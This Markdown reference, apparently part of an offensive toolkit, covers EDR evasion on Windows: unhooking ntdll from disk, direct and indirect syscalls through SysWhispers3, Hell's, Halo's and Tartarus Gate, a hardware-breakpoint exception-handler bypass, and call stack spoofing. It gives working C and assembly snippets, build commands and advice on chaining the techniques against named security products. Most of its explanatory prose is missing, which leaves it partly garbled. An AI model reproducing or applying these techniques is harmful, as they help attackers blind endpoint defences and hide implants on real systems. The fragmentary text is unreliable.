# Unhook /  /  syscall

>  /  /

" hook" unhook  hardware breakpoint Blindside
 MITRE ATT&CK T1562.001 / T1027 / T1055

## 1. Peruns Fart / Fresh Ntdll from disk

###

EDR  hook  ** ntdll.dll** `C:\Windows\System32\ntdll.dll`
 ntdll  `.text` hook

```text
 ntdll.dll (RWX)

   .text ( EDR hook jmp)    .text


         NtMapViewOfSection(disk_ntdll)

   C:\Windows\System32\ntdll.dll
```

###

```c
//
// 1. CreateFileW("\\Device\\HarddiskVolumeX\\Windows\\System32\\ntdll.dll")  //
// 2. NtCreateSection (SEC_IMAGE)
// 3. NtMapViewOfSection
// 4.  .text
// 5. NtProtectVirtualMemory  ntdll .text  RW
// 6. memcpy
// 7. NtProtectVirtualMemory  RX
```

###

- `NtProtectVirtualMemory`  hook    ** syscall**  `NtProtectVirtualMemory`
-  EDR  `NtProtectVirtualMemory`  ntdll  W  ETW patch
- Peruns Fart  ETW-TI  `KERNEL_MODULE_LOAD``PROTECTVM`   ETW

## 2.  syscall (Direct Syscall)

###

 ntdll  syscall stub

```asm
NtAllocateVirtualMemory:
    mov r10, rcx
    mov eax, 0x18      ; SSN (Win11 24H2 )
    syscall
    ret
```

`syscall`  SSDT hook

### SysWhispers3

```powershell
git clone https://github.com/klezVirus/SysWhispers3
cd SysWhispers3
python3 syswhispers.py --preset all --action edit -o syscalls
```



```text
syscalls.h    -
syscalls.c    - C
syscalls.asm  - MASM  stub
syscallsstubs.std.x64.asm  -  syscall
```

 Visual Studio

```text
1.  .asm  MASM (Custom Build Tool)
2. include syscalls.h
3.  Sw3NtAllocateVirtualMemory(...)  NtAllocateVirtualMemory
```

###  syscall  NtCreateFileC

```c
// syscalls.asm
// Sw3NtCreateFile PROC
//     mov [rsp +8], rcx
//     mov [rsp+16], rdx
//     mov [rsp+24], r8
//     mov [rsp+32], r9
//     sub rsp, 28h
//     mov ecx, 0x55           ; function hash ( SSN)
//     call Sw3GetSyscallNumber
//     add rsp, 28h
//     mov rcx, [rsp+8]
//     mov rdx, [rsp+16]
//     mov r8,  [rsp+24]
//     mov r9,  [rsp+32]
//     mov r10, rcx
//     syscall
//     ret
// Sw3NtCreateFile ENDP

#include <windows.h>
#include "syscalls.h"

int main(void) {
    HANDLE hFile = NULL;
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING uName;
    IO_STATUS_BLOCK iosb;
    WCHAR path[] = L"\\??\\C:\\Windows\\Temp\\edr_test.bin";

    uName.Buffer = path;
    uName.Length = (USHORT)(wcslen(path) * sizeof(WCHAR));
    uName.MaximumLength = uName.Length + sizeof(WCHAR);

    InitializeObjectAttributes(&oa, &uName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS st = Sw3NtCreateFile(
        &hFile,
        FILE_GENERIC_WRITE,
        &oa,
        &iosb,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );

    if (st >= 0) {
        //
        Sw3NtClose(hFile);
        return 0;
    }
    return (int)st;
}
```

###

- syscall  implant  `.text`  ntdll  kernel-mode telemetry  "syscall from non-ntdll address"
-  indirect syscall

## 3.  syscall (Indirect Syscall)

###

syscall  ntdll.dll SSN

```text
implant
    mov r10, rcx
    mov eax, <SSN>
    jmp [<ntdll  syscall;ret gadget >]   ;  syscall  implant
```

 gadget  `Nt*`  `syscall; ret`
kernel-mode ETW provider  RIP  ntdll

### SysWhispers3 indirect

```powershell
python3 syswhispers.py --preset all --action edit --mode jumper -o syscalls
# --mode jumper            => indirect syscall
# --mode jumper_randomized =>  jmp
```

 stub

```asm
Sw3NtAllocateVirtualMemory PROC
    mov [rsp+8], rcx
    ...
    mov ecx, 0x18                  ; function hash
    call Sw3GetSyscallNumber       ;  SSN -> eax
    call Sw3GetSyscallAddress      ;  ntdll  syscall;ret  -> rbx
    ...
    mov r10, rcx
    jmp rbx                        ;  ntdll  syscall
Sw3NtAllocateVirtualMemory ENDP
```

## 4. Hell's Gate / Halo's Gate / Tartarus Gate

"SSN "

### Hell's Gate

-  ntdll  hook
-  implant  ntdll  `Nt*`  4  `mov eax, <SSN>`  SSN
-  SSN Windows
-  ntdll  hook jmp

### Halo's Gate

-  Hell's Gate  hook
-  hook prologue** /  N **
-  ntdll  `Nt*`  SSN  hook  SSN

```text

  NtAllocateVirtualMemory  SSN = 0x18
  NtQueryInformationProcess SSN = 0x19
  NtProtectVirtualMemory    SSN = 0x50

 NtAllocateVirtualMemory  hook  SSN
   hook  SSN = 0x17
   hook  SSN = 0x19
   NtAllocateVirtualMemory SSN = 0x18
```

### Tartarus Gate

-  **Hook  SSN  syscall **  hook
-  SSN  syscall;ret gadget
-  indirect syscall

###  git clone

```text
Hell's Gate:    am0nsec/HellsGate
Halo's Gate:    am0nsec/HellsGate ( fallback ) / SafeBreach-Labs/HalosGate-PoC
Tartarus Gate:  trickster0/TartarusGate
SysWhispers3:
```

## 5. Hardware Breakpoint Blindside

###

 `DR0-DR3`  EDR hook trampoline
 VEH (Vectored Exception Handler)  RIP ** hook trampoline **
 EDR  ntdll  syscall

###

-  ntdll  `NtProtectVirtualMemory`
-  unhookhook
- ETW-TI

###

```c
// 1. AddVectoredExceptionHandler
// 2.  hook  DR0..DR3 ( 4  single-step rotate)
// 3. SetThreadContext(thread, &ctx)  DRx
// 4.  EDR hook trampoline  -> VEH
// 5. VEH  EXCEPTION_POINTERS->ContextRecord->Rip  ntdll  syscall;ret
// 6. ContinueExecution

LONG CALLBACK Blindside(EXCEPTION_POINTERS* ep) {
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        DWORD64 rip = ep->ContextRecord->Rip;
        if (rip == g_hookedNtAllocVM) {
            // SSN  eaxR10 = RCX ntdll  syscall;ret
            ep->ContextRecord->Rip = (DWORD64)g_syscallGadget;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
```

###

-  DRx
-  EDR  hook `NtSetContextThread` / `NtGetContextThread`
- Win11 22H2+  HVCI /

## 6. Call Stack Spoofing

###

 EDR  `NtAllocateVirtualMemory` / `NtCreateThreadEx`  syscall  `RtlCaptureStackBackTrace`
implant  **non-image-backed memory**

###  ACallStackSpooferWilliam Burgess



1.  syscall  swap
2.  `kernel32!BaseThreadInitThunk  ntdll!RtlUserThreadStart`
3. syscall  swap

###  BSilentMoonwalk

 desynchronized stack

```text

  implant      trampoline ( RSP / RBP / )

                syscall (RtlCaptureStackBackTrace )

                trampoline    implant
```

 unwinding `RtlVirtualUnwind`  `RUNTIME_FUNCTION` / `UNWIND_INFO`

###  OPSEC

- call stack spoof + indirect syscall + ETW patch  CrowdStrike / SentinelOne
-  sleep  spoof spoof EDR

## 7.

|  |  |  |  | ATT&CK |
|------|------|--------|------------|--------|
| Peruns Fart |  hook |  |  ETW  | T1562.001 |
| Direct syscall (SysWhispers) |  hook |  | -kernel  RIP  implant | T1106 / T1562.001 |
| Indirect syscall (jumper) |  hook + kernel RIP  |  | - | T1106 |
| Hell's / Halo's / Tartarus | SSN  |  |  | T1027 |
| HWBP Blindside | hook +  |  |  | T1562.001 |
| CallStackSpoofer / SilentMoonwalk | call stack telemetry |  |  | T1564 |

**Halo's Gate + indirect syscall + CallStackSpoofer + ETW patch**

##

- SysWhispers3<https://github.com/klezVirus/SysWhispers3>
- Hell's Gate / Halo's Gate POC<https://github.com/am0nsec/HellsGate><https://github.com/SafeBreach-Labs/HalosGate-PoC>
- Tartarus Gate<https://github.com/trickster0/TartarusGate>
- CallStackSpoofer<https://github.com/WithSecureLabs/CallStackSpoofer>
- SilentMoonwalk<https://github.com/klezVirus/SilentMoonwalk>
- Blindsidehardware breakpoint<https://www.cyberark.com/resources/threat-research-blog/blindside-a-new-technique-for-edr-evasion-with-hardware-breakpoints>
- MITRE T1562.001<https://attack.mitre.org/techniques/T1562/001/>

##

unhook  telemetry  `references/telemetry-blinding.md`
